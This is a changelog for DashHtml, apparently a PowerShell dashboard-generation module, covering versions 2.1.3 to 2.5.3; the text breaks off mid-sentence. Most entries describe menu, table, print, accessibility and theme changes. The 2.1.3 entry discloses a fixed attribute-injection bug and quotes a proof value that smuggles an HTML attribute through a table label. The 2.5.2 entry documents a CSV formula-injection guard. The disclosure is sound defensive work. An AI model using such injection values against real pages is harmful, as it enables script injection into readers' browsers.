# Changelog

All notable changes to DashHtml are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).
Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.5.3] - 2026-10-19

### Changed
- **Menu overflow after one row (was two).** A menu strip whose chips do not fit on one row now shows the ones that fit plus "More (n)" at the end of that row; 2.5.0 to 2.5.2 let a strip take two rows before "More" appeared. The top strip also keeps its place on the title line: with 13 top-level items (a vSphere documentation report) it used to drop onto a line of its own, so the bar took two rows and "More" never appeared. Reports with a short menu look the same. `-NavOverflow Wrap` keeps the earlier layout (a long menu on a line of its own, wrapping). Regenerate a report to get the change.

### Fixed
- Menu fit: the row-count badges (and `-NavBadge` pills) were filled in after the chips were measured, so a strip could end up one row taller than the fit allowed. They are filled first now; a filter that widens a badge fits the strip again. The fit no longer counts the strip padding as usable width, measures the real "More" button, and settles against the actual layout (it could leave out a chip that fit, or keep one that did not). The strip is fitted again when the title line changes width (theme and density labels, a late font), not only when the window does.
- Keyboard: the arrow keys never reached the "More" button (it sits inside a wrapper), so with one tab stop per strip the overflow menu could only be opened with a mouse. Arrows, Home and End now include it.
- The "Top" button used an inline `onclick` attribute; it is bound by the runtime like every other control (no `on*` attributes in the page).
- `Export-DhYamlSchema -OutFile` with a relative path wrote to the process directory instead of the current PowerShell location.
- Baseline markers: the "Removed since ..." rows are drawn when the group is opened (they were rebuilt on every filter keystroke, page or sort, even while collapsed); print still shows them. A number compared with text in another format (`1.5` and `'1,5'` from an it-IT `Import-Csv` baseline) now gives a warning, like a date compared with text.
- `-NavLayout Auto` no longer counts the path of a Global item: the menu leaves that node out, so a deep path could switch a report to the sidebar for a node nobody sees.
- 15 module source files were CRLF on disk while the repository holds LF; they are LF now, and a test checks that module sources have no BOM and no CR.
- `Tools\Test-DhV2Upgrade.ps1`: skips `Backup` / `Backups` folders unless `-IncludeBackups` (old copies under the same names made their hits look like hits in the live scripts), shows each file's relative path, `-PassThru` returns the hits as objects, and piping it no longer fails with "out-lineoutput". It is a 1.x-to-2.0 migration aid: the skill now points to `Update-DhScript` instead.

## [2.5.2] - 2026-10-19

### Fixed
- CSV export and "copy table as CSV" now guard against spreadsheet formulas: a text cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return gets a leading apostrophe, so a value taken from a directory attribute cannot run as a formula in Excel. Numbers such as `-5` are unchanged.
- `-StrictNav` warns about a Global item that also has a `-NavPath` (the path only adds an empty menu node, which the menu leaves out); `Tools\Show-DhNavMap.ps1` leaves that node out too. `Test-DhA11y` and `Test-DhContrast` exit with 1 when they find something, so a CI step can fail on them; the browser probe no longer passes `-WindowStyle` off Windows.
- Keyboard: every collapsible header (summary strip, collapsible block, card group) was a div with a click handler, unreachable without a mouse. It is now a button (role, tab stop, `aria-expanded`, `aria-controls`, Enter/Space) through one helper, `dhBindCollapsible`.
- Accessibility names: the table filter box, its clear button, the select-all checkbox and every row checkbox have an accessible name; rows of a multi-select table carry `aria-selected`.
- Contrast: `--cell-ok/warn/danger/nodata-fg` and `--text-secondary` were below 4.5:1 on striped or selected rows in several themes (worst: VMware dark danger 3.0, VMware light no-data 2.7). They are adjusted in 10 of the 12 theme files (Rag needed nothing), as little as possible (many by a few percent). Colours of the cell states and secondary text therefore differ slightly from 2.5.1 in those themes.
- Menu: a node with no content of its own and nothing below it (for example a Global item that carries a `-NavPath`) no longer appears as a dead end. Nodes declared in `-NavTree` are never pruned.
- Paths in the module loaders, tests, examples and tools use `/` (works on Windows and Linux); CI runs a Windows and an Ubuntu job (the Ubuntu job may still fail until its first run is clean).

### Added
- **Baseline markers** (`Add-DhTable -Baseline -KeyField [-BaselineFields] [-BaselineLabel]`): a report that runs on a schedule marks its rows New or Changed against the previous run, shows the old value of a changed cell, counts them under the toolbar, filters by Change chips, keeps the rows that disappeared in a collapsed "Removed since ..." group, and adds a Change column to exports (a checkbox adds the removed rows). Matched by a declared key (case-insensitive); only the table's columns count as Changed unless `-BaselineFields` says otherwise; a date compared with text (a baseline read with `Import-Csv`) gives a warning; duplicate keys throw; the baseline is data and is not written to YAML. Nothing changes without `-Baseline`. New example view in `Feature-Tables`.
- ``Tools\Test-DhContrast.ps1``: WCAG ratios of the new and old classes in all 6 theme families, light and dark, with headless Edge/Chrome; selectors and accepted exceptions in `Tools\contrast-selectors.json`.
- `Tools\Test-DhA11y.ps1`: accessibility audit of exported reports (names, roles, states, landmarks, ids, focus and motion rules). Helpers `Find-DhBrowser.ps1` and `BrowserProbe.ps1`.
- `Export-DhYamlSchema` (DashHtml.Design) and `DashHtml.Design\dashhtml.schema.json`: JSON Schema of the layout YAML, generated from the cmdlet metadata, rejects mistyped keys, wrong value types and unknown block types. A test fails when the committed schema is stale.
- 31 node tests (`Tests\js\runtime.test.js`) covering formats, thresholds, aggregates, column memory, network layout and path finding, tree-table paths, menu fit and prune, collapsible keyboard handling. `dh-extract.js` gained `loadWith` for top-level variables.
- Footer aggregation and text are now the named functions `dhAggregate` and `dhFootText` (same behaviour).

### Changed
- ReleaseNotes in both manifests are condensed to the current minor plus one line per older release (about 2,700 characters; the cap is 10,600). The full history stays here.
## [2.5.1] - 2026-10-18

### Fixed
- Print: soft shadows are dropped in print. They were rendered as blurred images that hid heatmap cells and block titles in the PDF (and made files about 2.5 times larger). Tables wider than the page wrap to fit: 8 pt, tighter cells, header words kept whole, sparklines capped.
- Contrast: heatmap values now pick dark or white text per cell (they were unreadable in dark mode and on deep cells). `.nav-badge`, tree-table type letters and tree flags use the primary text colour; every theme, light and dark, was measured (WCAG ratio) on the map, tree, tree table, nav and heatmap classes.
- `ConvertTo-DhYaml` never wrote `-NavLayout`/`-NavMaxDepth` and, since 2.5.0, not `-NavAllLabel`, `-NavTree`, `-StrictNav` or `-NavOverflow`; they are written now (defaults stay out of the YAML). Generated scripts keep `[ordered]` hashtables, so tree-table `Properties` keep their order.
- Footer `avg` of an unformatted column is rounded (column `Decimals`, default 2) instead of showing 37.333333333.

### Added
- `Tests\js\dh-extract.js` (loads named runtime functions from the shipped fragments) and `Tests\js\runtime.test.js` (`node --test`). `Build.ps1` runs them and prints the node test count.
- `Tools\Test-DhPrint.ps1`: prints dashboards to PDF through Edge/Chrome.
- The folder is now a git repository (`.gitignore`, `.github\workflows\ci.yml`).
## [2.5.0] - 2026-10-18

### Fixed: print and themes (2.4.2 checks)

- Print: a table wider than the page no longer loses its right-hand columns (cells wrap, 8 pt, resize and sort marks hidden).
- Three CSS variables used by the nav strips, breadcrumb, global filters and collapsible bodies were never defined in any theme (--bg-base, --text3, --trans-med), so those rules did nothing. They now use --bg-page, --text-muted, --trans-normal: nav strips below the first get the page background, the breadcrumb is muted, global filter selects get a background.
- New: Tools\Test-DhPrint.ps1 (headless Edge/Chrome to PDF with page counts) and a test that every CSS variable used without fallback is defined in all 12 themes.

### Added: column picker

- Column key `Hidden = $true`: the column starts unticked in the Columns picker (still in the data and
  the detail panel). The button now reads "Columns (n hidden)". A table whose every column is Hidden
  throws.
- `Add-DhTable -RememberColumns` (opt-in): the reader's ticks are kept per viewer in the browser's
  local storage and restored next time, also after the report is regenerated (key = hash of the
  report title, `-GeneratedBy` and the table id). Columns are matched by field name. A new
  **Default columns** entry in the picker restores the author's columns and forgets the saved choice.
  Blocked storage never breaks the table.

### Added: menu

- `New-DhDashboard -NavAllLabel` (a string, or a hashtable of path = label): an addressable "All"
  child on group nodes. The All view shows the group's own content and everything below it. Its
  path ends in the reserved segment `*` (rejected in an ordinary `-NavPath`), it sorts first among
  its siblings and is never the opening view. `Test-DhNavMatch` and the browser `navMatches`
  implement it identically.
- `New-DhDashboard -NavTree @( @{ Path; Label; Order } ... )`: the menu declared once. It supplies
  labels and sibling order (an item's own `-NavLabel` / `-NavOrder` wins; the skeleton wins over
  declaration order) and creates nodes before anything sits on them.
- Empty view: a selected view with nothing of its own (an empty `-NavTree` node, a deep link to a
  renamed node) shows "No content in this view" with a link back to its parent, instead of a blank
  page. Banners and global items do not count as content.
- `New-DhDashboard -StrictNav`: export-time warnings (never an error) from `Test-DhNavLint`: a
  path deeper than 3 levels, sibling names that differ only in case or by one letter, sibling
  labels that clash, a path missing from `-NavTree`, a `-NavTree` node with nothing on it, a
  Subtree item with nothing below it, a `-NavAllLabel` that names no group. With `-StrictNav` the
  empty-view note also says which path is empty.
- Menu overflow: when a strip's chips would wrap past two rows, the ones that do not fit move into
  a "More (n)" menu and the selected chip always stays visible. `-NavOverflow Wrap` keeps the
  old wrapping. Short menus are unchanged.
- Menu accessibility: one tab stop per strip (roving tabindex); Left, Right, Home, End move along
  a strip; Space activates; the More menu opens with Down or Enter and closes with Escape; the
  sidebar rail takes Up, Down, Left (parent), Right (open or step in), Home, End; `aria-current`
  marks the current item and the breadcrumb's last entry; keyboard focus stays on the same item
  when the menu is rebuilt after a change.
- `Tools\Show-DhNavMap.ps1` now shows `-NavTree` labels and empty nodes and the All views, and
  compares sibling names case-sensitively.

### Added

- `Add-DhTreeTable` (cmdlet #27): a directory explorer for OUs, groups, users and computers. A tree
  on the left (find box, type filter, status, flags, counts, keyboard) and the selected object on
  the right with tabs Properties, Members, Member of and Nesting. Nesting lists the groups nested
  below a group and every path up to the top-level groups (effective membership); a circular
  nesting is marked and not followed. Data is two flat lists, `-Rows` (Id, ParentId, Type, Label,
  Status, Flags, Properties, Detail) and `-Memberships` (GroupId, MemberId), so a collector can
  emit it without recursion. Limits: warns above `-MaxRows` (5,000), throws above 20,000.
  Example: `Demo-ActiveDirectory`, view Identity / Directory.

## [2.4.1]

Menu fixes and a new example set. **Behaviour change:** an alert banner declared with
`-NavPath` now follows the menu (see Fixed); a banner you meant to be global needs no path.

### Fixed

- `Add-DhAlertBanner -NavPath` / `-NavScope` (and `-NavGroup`) were ignored by the browser:
  a banner with a path showed on every view, and a `-NavGroup` banner never showed. The path
  and scope are now exported and applied like any other section: Exact = that view, Subtree =
  that node and below, no path = every view. A banner never adds a node to the menu.
- Footer totals (`Aggregate` on a column) now follow the selection in a `-MultiSelect` table: tick rows and the footer sums, averages or counts just those rows (highlighted, with a tooltip saying so); with nothing ticked it covers every filtered row, as before. The footer used to ignore ticking a row.
- `-NavOrder` ordered the item's own menu node but, in the browser, also its parents, so an
  ordered leaf moved its group ahead of unordered siblings (the PowerShell tree was already
  right). It now orders the item's own node only.

### Added

- `Tools\Show-DhNavMap.ps1`: prints the menu of an exported dashboard (labels, keys, order),
  the view it opens on, and for every view the sections it shows in page order (banners, then
  blocks, then tables). Warns about a section with no path (it appears on every view) and a
  view that shows nothing. The example smoke test runs it on every example.
- `Examples\README.md`: what each example shows and the menu rules.

### Changed: examples

- Redefined as a full set without version numbers. Four realistic reports, each laid out as a
  menu with a global banner or filter, branch KPI strips and one view per question:
  `Demo-ActiveDirectory`, `Demo-VMware`, `Demo-AzureInfrastructure`, `Demo-Microsoft365`.
  Nine single-capability scripts: `Feature-Navigation`, `Feature-NavigationSidebar`,
  `Feature-Tables`, `Feature-Charts`, `Feature-KpiTiles`, `Feature-Assessment`,
  `Feature-MapsAndGrids`, `Feature-FiltersAndSearch`, `Feature-PageElements`. The previous
  `Demo-Feature-*` scripts are replaced (a copy is in `Backups\`).

## [2.4.0]

Maps, search and OU trees. Plan: `NewFeatures/plan-v2.4.md`. **No breaking changes**,
with one visible exception: table columns are now as wide as their widest text (see
"Changed"); add `-ColumnFit Fixed` to a table to keep the old look. A report that uses
none of the new options exports the same JSON as 2.3.0. Regenerate existing dashboards:
the runtime is baked into each HTML file.

### Added: network map

- `Add-DhNetworkMap` (cmdlet #25): nodes joined by links, for what is not a tree
  (replication, site links, trusts, tiers). Nodes carry `Group`, `Tier`, `Status`,
  `Badge` (a list, such as PDC / GC), `Target`, `Detail` and `LinkTableId`; edges carry
  `Label`, `Status`, `Style` (solid / dashed), `Direction` (none / forward / both) and
  link targets. Several edges between two nodes are drawn as parallel curves; a self
  link is a loop.
- Two deterministic layouts (the same data always gives the same picture, no force
  simulation): `grouped` (boxes, nested boxes) and `layered` (lanes by Tier, tier 0 on
  top; a node without a Tier takes its depth from the links; one barycentre sweep
  orders each lane).
- Pan and zoom (shared with the topology map), arrowheads, edge labels (hidden above
  400 links until you turn them on), status and badge filter chips, node search, click
  to highlight a node's links and neighbours, the detail side panel or a jump to a
  table, **Trace path** (shortest directed path from the selected node to the nearest
  `Target` node), and **SVG** download (the styles are embedded). A text list of the
  links is included for screen readers. Limits: `-MaxNodes` 300, `-MaxEdges` 1500.

### Added: OU tree filter

- `Add-DhTreeFilter` (cmdlet #26): a collapsible tree (find box, expand / collapse all,
  status dot, flag chips, counts, a detail button, full keyboard support) that filters
  a table by path. `-Match Prefix` for `contoso.com/HQ/Users` paths, `-Match Suffix`
  for distinguished names; the separator is part of the test, so `HQ` never matches
  `HQ2`. Counts come from the script or, with `-CountFromTable`, from the table's rows
  (each row is credited to the deepest node it reaches, then rolled up).
- It composes with the table's other filters. `TableEngine.setPathFilter` is the one
  place the filter is set, the existing "filtered by" badge shows it, its clear button
  clears it, and the selection is saved in the URL (`pathFilters`).
- It is a filter, not a second copy of the data. A full object tree with members and
  nesting waits for collectors that emit that data.

### Added: search and menu badges

- `New-DhDashboard -Search`: a box in the menu bar (press `/`). Finds menu pages, block
  and table titles, findings, and table rows with a hit count per table. Rows are
  scanned in time slices with the table's own matcher (`_matchText`), so typing never
  freezes the page. Choosing a table hit goes through `_dhJumpToTable`. Off by default.
- `New-DhDashboard -NavBadge`: a pill on each menu item with the worst severity among
  the non-OK findings on that page and below, and its count; the tooltip gives the
  breakdown. Off by default.

### Changed

- Tables fit each column to its widest text. Cells used to be cut off at 340 px with an
  ellipsis, and a long value lost its tail. The browser now measures the formatted
  text of every row (and the header with its sort icon), so a virtual table sizes
  columns from rows it has not drawn. Precedence: a width the reader dragged, then the
  column's `Width`, then the measured width, clamped to `[MinWidth, -ColumnMaxWidth]`
  (default 800; text beyond the cap still ends in an ellipsis with a tooltip).
  Double-click a column edge to fit that column. Measuring repeats after web fonts load
  and when the density changes. `Add-DhTable -ColumnFit Fixed` keeps the old behaviour;
  `-ColumnMaxWidth` and a column `MinWidth` tune it.
- `Add-DhTopologyMap` finds cycles with an Id lookup instead of a pipeline per step
  (200 nodes: 283 ms, the check itself no longer O(n^2)). Same errors.
- `ConvertTo-DhYaml` now keeps `themeMode`, `printCover`, `navBadge` and `search`
  (written only when they differ from the default).

### Tooling and docs

- `DashHtml.Design` 2.4.0, `RequiredModules` DashHtml 2.4.0: the new cmdlets round-trip
  through YAML, `ConvertFrom-DhScript` recognises them, `Update-DhScript` and
  `Tools/Test-DhV2Upgrade.ps1` audit them, `Build-DhReference.ps1` lists them.
- New example `Examples/Demo-Feature-Network.ps1`.

## [2.3.0]

Details and assessment visuals. Source: `NewFeatures/review-external-html-widgets.md`
and the 2.3.0 plan. **No breaking changes.** A report that uses none of the new
options looks and behaves as in 2.2.0 (the exported JSON of a plain finding, bar
chart, status grid or table is byte-identical). Regenerate existing dashboards:
the runtime is baked into each HTML file.

### Added — detail drawer

One shared side panel (`Private/Get-DhJsDrawer.ps1`) for the detail of one thing.
Escape or a click outside closes it, focus goes back to where you were, a view
change closes it, and it never prints.

- `Add-DhTable -DetailDrawer [-DetailFields] [-DetailTitleField]`: click a row (or
  press Enter on it) to read its properties as label/value tiles. Fields may be
  names or `@{ Field; Label }`, may name properties that are not columns, and are
  checked against the data (case-sensitive). Master-detail links still fire.
- `Add-DhStatusGrid`: a cell takes `Detail` (text, one section, an array of
  sections, or `@{ Title; Subtitle; Sections }`), `Glyph` (1-3 characters drawn in
  the cell) and `Self`; `-SelfDiagonal` hatches the cells whose row and column
  labels match (a DC replicating "with itself"). A cell with detail is a real
  button (keyboard operable); a link on the same cell becomes the panel's
  "Show in table" button.
- `Add-DhFindings`: a finding takes `Detail`, shown by an "Open details" button.

### Added — `Add-DhKeyValue` (cmdlet #23) and `Add-DhRecordList` (cmdlet #24)

- `Add-DhKeyValue`: a block of label/value tiles with an optional status colour.
- `Add-DhRecordList`: one row per record (status dot, title, sub line, up to four
  metrics) that expands to sections; filter box, Expand all / Collapse all, printed
  expanded. `-MaxItems` warns rather than fails.
- Both, the drawer and the findings split layout draw the same **sections**
  (`kv`, `bars`, `statusList`, `checks`, `table`, `text`, `links`) through one pure
  function, `renderSections`. PowerShell side: `ConvertTo-DhSections`.

### Added — score ring and maturity ladder (`Add-DhSummary`)

- `Style='score'`: a ring with a verdict label, a line of facts, the delta against
  `Previous` (`LowerIsBetter` flips the delta colour for a risk score) and a
  `NotAssessed` count beside it, so a score that rose because checks went dark is
  visible. Validated like a gauge; colours from `-Rag` or `Class`, theme tokens only.
- `Style='maturity'`: 2 to 10 `Levels`, the `Current` one marked (0 = none reached),
  its description, and the `Criteria` the next level still needs. The script decides
  the level; DashHtml draws it.
- Both are full-width like the verdict tile; the score also appears on the print cover.

### Added — findings

- `-Layout Split`: a list on the left and the selected finding's detail on the
  right (collapses under the list on a phone; printed stacked, expanded).
- Per finding: `Facts` (tiles), `Evidence` (object / value / status / note rows,
  capped by `-MaxEvidenceShown`, default 50), `Change` (`new|worse|better|resolved`:
  a badge and a filter chip; the script compares with the last run) and `Detail`.
- `-AllClearText`, also on `Add-DhTable`: a check mark and a sentence when the
  check found nothing, instead of an empty block. `Add-DhFindings -Findings` is no
  longer mandatory and `Add-DhTable -Data` may be empty, so a clean check can be
  declared (and a YAML round trip, which drops empty lists, still rebuilds it).

### Added — small things

- Table cell types `chips` (an array as tags, e.g. FSMO roles) and `path` (an array
  as `A → B → Tier 0`). CSV/XLSX export the joined text; list elements stay strings.
- `Add-DhBarChart -Rag` (colour by value) and `-KeyClass @{ Critical='cell-danger' }`
  (colour by category). Ignored, with a warning, on a stacked chart.
- `THIRD-PARTY-NOTICES.md`: the bundled export libraries and their licences, and the
  projects that inspired the new widgets (design ideas only, no code copied).
  `Build.ps1` stages it with `Vendor\`.
- `Examples/Demo-Feature-Assessment2.ps1`.

### Changed

- The pan/zoom/fit code moved out of `renderTopologyMap` into `createPanZoom` so the
  coming network map can share it. The window `mousemove`/`mouseup` listeners now
  exist only during a drag (they were added once per map and never removed), and the
  resize wiring stops when the map has left the page.
- DashHtml.Design 2.3.0 knows both new cmdlets; `Update-DhScript` and
  `Test-DhV2Upgrade` audit them.

### Fixed

- The print stylesheet hid `.topo-toolbar`, a class that does not exist; the real
  `.topology-map-toolbar` printed. It is hidden now.
- `Build-DhSkill.ps1` wrote the skill's Markdown with a UTF-8 byte-order mark, which
  claude.ai rejects ("SKILL.md must start with YAML frontmatter"). It writes without a
  BOM now and checks the raw bytes (fixed in the 2.2.0 skill package on 2026-10-14).

## [2.2.0]

Assessment features: what an audit report needs. Source: `NewFeatures/plan-v2.2.md`
(N1–N8), with decisions D1–D4 as agreed. **No breaking changes.** A report
that sets none of the new options looks and behaves as in 2.1.4, except
for the two improvements to every report described below: export
libraries no longer block page load, and every report gets a Print button.

### Added — `Add-DhFindings` (cmdlet #22)

A list of findings, one expandable row each: severity badge, title, area and
affected count. Expanded, a row shows:

- the description and the recommendation;
- the affected objects, capped, with "+N more";
- a **Show in table** jump to the evidence table, filtered;
- reference links.

Severity counter chips filter the list, and a text box filters over every
field. Optional group headers come from `-GroupBy Area|Severity`.

- Severities are `critical / warning / info / ok`, the alert-banner scale.
  `high / medium / low` are accepted as aliases (decision D2).
- Sorted critical → ok, then by affected count; `-SortBy None` keeps your order.
- Reference URLs go through the same scheme check as alert and tile actions,
  and are checked again in the browser.
- All text is HTML-encoded. There is no `-AllowHtml`.
- "Show in table" uses the 2.1.4 `jumpToTable`, so the filter, the clear
  button and linked charts all update together.
- `Export-DhDashboard` warns about an `AffectedTableId` that names no table.

### Added — verdict tile: `Add-DhSummary` `Style='verdict'`

A full-width overall assessment ("Action required") with an optional
caption and one chip per non-zero severity count. Without a `Class`, its
colour follows the worst count. It works in the page-wide strip and in
per-panel strips.

### Added — bar charts that measure a value

`Add-DhBarChart -ValueField <field> -Aggregate count|sum|avg|min|max
[-Unit] [-Decimals]`. Until now a bar chart could only count rows, so a
chart titled "replication lag (min)" drew row counts.

- `-ValueField` alone means `sum`.
- Percentages are a share of the grand total for `sum`, and are hidden for
  `avg / min / max`.
- Stacked charts allow `count` or `sum`.
- The field is checked against the table when the chart is added, and
  again at export (for charts declared before their table).
- Aggregation runs in the browser over the filtered rows, with the same
  rules as the table footer aggregates.

**Table charts render `Type='bar'`**, with the same options plus `TopN`.
This replaces the 2.1.4 "rendered from 2.2.0" warning.

### Added — link cells: `CellType='link'`

The URL comes from `UrlField`, which can be a property that is not a
visible column; `LinkText` sets fixed text. Only `http:` / `https:` /
`mailto:` URLs become links, built with DOM calls. Anything else renders
as plain text.

### Added — `New-DhDashboard -ThemeMode Light|Dark|Auto`

Sets the theme a report opens in. `Auto` follows the system setting, live,
until the reader toggles. A reader's saved choice (2.1.4) always wins.
The default is `Light`, as before.

### Changed — export libraries no longer block the page (`-ExportLibraries`)

SheetJS, jsPDF and AutoTable were blocking script tags in the page head.
On a network without internet access the report stayed blank until the CDN
request timed out, then the XLSX/PDF buttons raised an `alert()`. Now
`Export-DhDashboard -ExportLibraries`:

- **`Cdn` (default):** loads the libraries on the first XLSX/PDF click, with
  the same pinned SRI hashes. Offline, the buttons grey out with a "use
  CSV" tooltip. No `alert()`.
- **`Embed`:** inlines the libraries, about 1.3 MB, for air-gapped readers.
  The vendored copies in `DashHtml/Vendor/` were verified byte-for-byte
  against the pinned hashes, are re-checked on every embed, and ship with
  their licences (Apache-2.0, MIT, MIT). `Build.ps1` now stages `Vendor/`.
- **`None`:** no XLSX/PDF buttons.

### Added — printing

Every report gets a 🖨 Print button. While printing:

- the theme switches to light;
- every nav view appears, in menu order, each under a heading with its path;
- collapsibles, tab panels and findings are expanded (in CSS, so this
  works even without the print handlers);
- tables print up to `-PrintMaxRows` rows (default 200), with a "Showing N
  of M" note;
- nav, toolbars and filters are hidden; table headers repeat; pages are
  numbered;
- `New-DhDashboard -PrintCover` adds a cover page with the verdict tile.

Everything is restored after printing. Verified in headless Edge
`--print-to-pdf`, which runs the same handlers, so PDF pipelines get the
same layout.

### Fixed

- **A grid report widened the page on phones.** With any `-GridSpan` set,
  below 900px the single grid column was `1fr`, which cannot shrink below
  its content. A wide table pushed the whole page sideways instead of
  scrolling inside its own box. It is now `minmax(0, 1fr)`.
- **The table section header printed with a dark band.** Its gradient
  starts from a hard-coded dark colour; it now prints flat.

### Changed — internal

- The two hand-synchronised copies of the summary-tile serialiser in
  `Export-DhDashboard` are now one `ConvertTo-DhTileJson`. Verified
  byte-identical on a fixture covering every tile style, on both paths.
- Bar charts render through shared `aggregateBars` / `buildBarHtml`
  helpers, which the table charts reuse. Verified by comparing the rendered
  DOM of every existing bar variant before and after: identical.
- The runtime JS gains a `Get-DhJsPrint` fragment.

### DashHtml.Design 2.2.0

Recognises the findings block: YAML round-trip, `ConvertFrom-DhScript`,
and `Update-DhScript` / `Test-DhV2Upgrade` audits. Requires DashHtml 2.2.0.

### Examples

New `Examples/Demo-Feature-Findings.ps1`: a complete assessment report.
`Demo-ActiveDirectory.ps1` gains a verdict tile, a value bar chart and
findings.

## [2.1.4]

Fixes only, no new parameters. Source: `NewFeatures/plan-v2.2.md` (F1–F8, F10),
checked line by line against 2.1.3 before any change. **Regenerate** existing
dashboards to pick these up: the runtime is baked into each HTML file.

### Fixed — collapsible tables could not be opened (since 2.0.0)

`Add-DhTable -Collapsible $true -DefaultOpen $false` produced a table that
could never be opened. `Build-DhTableSections` emits
`button#tsect-toggle-<id>` and toggles visibility through `.open` on
`div#tsect-body-<id>`; the 2.0.0 runtime rewrite bound `.table-collapse-toggle`,
a class nothing emits. The 1.5.1 binding is back. Opening a folded table also
re-renders it, so a virtualised table laid out at zero height measures
correctly.

### Fixed — table `-Charts`: `pie` drew a donut, everything else vanished

The runtime rendered only `Type='pie'`, always as a donut, and silently dropped
any other type (an AD report lost three charts this way).

- A chart with **no** `Type` still draws a **donut**. Existing reports look the same.
- **`Type='pie'` now draws a solid pie**, as the name says. If you relied on
  `'pie'` giving a donut, change it to `'donut'`.
- `Type` is case-insensitive and validated. `'bar'` is accepted but skipped with
  a warning until 2.2.0 renders it. Any other value is skipped with a warning
  instead of disappearing. Neither throws, so a script that runs today keeps
  running.

### Fixed — "jump to table" left the UI half-updated

Alert-banner actions, summary-tile actions, status-grid cells and topology
nodes each carried a copy of "show the table and set its filter". They set
`filterText` directly, so the clear (×) button stayed hidden and charts
linked to the table went stale. These are the same defects 2.1.3 fixed for
pie and bar clicks. All four now call one function, `jumpToTable`, which
filters through `applyTextFilter`. It also unfolds a collapsed table and
scrolls it into view. It is exposed as `window._dhJumpToTable`.

### Fixed — theme choice was lost on reload

The theme toggle called `URLState.save()`, but the saved state had no theme
key. The choice is now kept in the URL hash, which a shared link carries, and
in `localStorage` (`dh-theme`), which keeps this browser's last choice. On
load the URL hash wins over `localStorage`, and both win over the report's
default. A small script in `<head>` applies the choice before first paint,
so the page doesn't flash the other theme. The button now says `☾ Dark` /
`☀ Light` instead of the internal theme name (`⇄ DefaultDark`).

### Fixed — density toggle out of sync after a reload

A restored density moved the body class but not the toggle's private
counter. The first click after a reload then either did nothing visible or
left two density classes on `<body>`. The two code paths also used
different glyphs for "Spacious". There is now one `DENSITY` table and one
position.

### Fixed — CSV export ignored `-ExportFileName`

XLSX and PDF used `-ExportFileName`; CSV used the table id. All three now
use the same name.

The right-click menu got two fixes along the way:

- **Copy cell value** and **Copy table as CSV** fall back to
  `execCommand('copy')` when `navigator.clipboard` is unavailable or refuses,
  which can happen on `file://` pages. Before, nothing happened.
- The menu items use classes instead of fixed ids, so a report with several
  tables no longer contains duplicate DOM ids.

### Added — export-time link check

`Export-DhDashboard` now warns, rather than rendering a silent no-op, when a
reference names a table that is not in the report. That covers:

- a bar chart, pie chart or range bar `TableId`;
- a filter-card `TargetTableId`;
- a status-grid cell or topology node `LinkTableId`;
- a summary-tile or alert-banner `Action.TableId`;
- a `Set-DhTableLink` end.

It also warns about a block with an unknown `BlockType`. Several of these
were never checked at all. The others were checked only by the `Add-Dh*`
cmdlet, and only when a table had already been added. The check runs on
the finished report, so declaration order doesn't matter. A chart or
filter card declared before its table renders correctly, which was checked
in a browser. Warnings only, no new throws.

### Changed

- `esc()` also encodes `'` as `&#39;`. Every attribute in the runtime is
  double-quoted, so no sink was affected; this is defence in depth.
- **Performance:** each row render looked the row up with
  `allData.indexOf(row)`, a linear scan, which made a render O(n²) on big
  pages and virtual windows. A row→index map is now built once.
- Help: `New-DhDashboard -NavTitle` no longer claims to default to `-Title`
  (it defaults to no nav title, as it always has). README and help now say
  "self-contained except the optional XLSX/PDF libraries" instead of
  "no CDN": those two buttons load SheetJS / jsPDF from cdnjs (2.2.0 makes
  this optional).

### Tooling

- `Add-DhRangeBar`, which shipped in 2.1.0, was missing from `Update-DhScript`
  and `Tools/Test-DhV2Upgrade.ps1` (block cmdlet lists) and from
  `Build-DhReference.ps1`. **DashHtml.Design 2.1.1.**

### Tests

- **`Tests/js/nav.test.js`** drives the **shipped** runtime under Node: it
  extracts the nav matcher and the table-collapse binding from
  `Get-DhJsNav.ps1` by their sentinel comments. A Pester wrapper generates
  the truth table from the PowerShell `Test-DhNavMatch`, so the JS mirror is
  pinned to the PowerShell source of truth; it is skipped when `node` is not
  on PATH. Until now only a spike tested a private copy of the matcher.
- New `Describe 'v2.1.4 fixes'`.
- The duplicate-Id test now covers every block cmdlet (it said "all" but
  covered 6).
- New `Tests/DhTestHelpers.ps1` (`Export-DhTestHtml`, `Get-DhTestJsFunction`).

## [2.1.3]

### Fixed — `Add-DhBarChart -ClickFilters` never worked

Clicking a bar did nothing and logged `ReferenceError: engines is not defined`.
`renderBarChart` built an **inline `onclick`** attribute, and inline handlers are
evaluated in *global* scope, while `engines` is a `var` inside the runtime IIFE.
Every other interactive control in the module binds with `addEventListener`
inside that IIFE, which is why this was the only path that broke.

The handler is now bound with `addEventListener` after the markup is written.
The registry was deliberately **not** exported to `window` — that would have made
the handler work while leaving the second defect below in place.

### Fixed — a bar label containing `"` could inject HTML attributes

The inline attribute spliced the bar's label into markup escaping only *single*
quotes. A label containing a double quote terminated the attribute early and the
remaining JavaScript was parsed as HTML attributes. Measured with the label
`say "hi"`: the element ended up with **5 attributes instead of 2**. Proven
controllable — a table value of `x" data-injected="yes` wrote a real
`data-injected` attribute; substituting an event-handler name yields a live
handler. The attribute was written at *render* time, so it applied even though
the click itself was broken.

The label is now captured as a JavaScript value and never reaches the markup, so
there is nothing left to escape. Any dashboard built with `-ClickFilters` over
data that can contain a double quote should be regenerated.

### Fixed — pie-slice clicks left the UI half-updated

`Add-DhPieChart -ClickFilters` worked, but carried its own partial copy of the
"apply a text filter" sequence: it never revealed the filter's clear button
(`.filter-clear` is `display: none` until shown, so the user was left with a
filter and no visible way to clear it) and never refreshed linked bar charts,
pie charts or range bars, which went stale against the filtered table.

All three call sites — the search box, pie slices and bar clicks — now route
through one new `TableEngine.prototype.applyTextFilter`. Add a step there, not
in a caller.

### Fixed — the table toolbar was malformed on every report

`<div class="table-toolbar" id="toolbar-..."` was missing its closing `>`. The
parser consumed `<div class="toolbar-left"` as *attributes*, so `.toolbar-left`
never existed and the stray `</div>` closed the toolbar early — leaving
`.toolbar-right` outside it, at width 0. The row count, page-size selector,
Columns button and CSV/XLSX/PDF buttons dropped onto a second, left-aligned row
instead of sitting right-aligned beside the filter box.

One character. Present since the toolbar was introduced, in every generated
report. Regenerate to pick up the corrected layout.

### Added — clickable bars are keyboard-operable

Bars rendered with `-ClickFilters` now carry `role="button"` and `tabindex="0"`,
respond to Enter and Space, and get a `:focus-visible` ring from the active
